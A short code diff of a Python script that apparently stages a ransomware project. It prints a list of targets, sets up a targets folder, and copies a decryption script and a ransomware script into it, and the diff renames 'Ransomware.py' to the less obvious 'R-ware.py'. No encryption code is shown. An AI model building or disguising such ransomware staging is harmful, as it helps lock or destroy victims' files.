@@ -14,7 +14,7 @@ from stat import *
 
 print("\nCURRENT LIST OF TARGETS:\n")
 
-#get the directory that this file script is in
+#get the directory that this script is in
 cwd = os.getcwd()
 
 #change this path if you want your targets folder to go elsewhere
@@ -55,8 +55,8 @@ f.close()
 rw_dir_d = os.path.join(rw_dir, 'R-Decryption.py')
 copyfile(os.path.join(cwd, 'R-Decryption.py'), rw_dir_d)
 
-rw_dir_e = os.path.join(rw_dir, 'Ransomware.py')
-copyfile(os.path.join(cwd, 'Ransomware.py'), rw_dir_e)
+rw_dir_e = os.path.join(rw_dir, 'R-ware.py')
+copyfile(os.path.join(cwd, 'R-ware.py'), rw_dir_e)
 
 f = open(rw_dir_d, "r")
 contents = f.readlines()
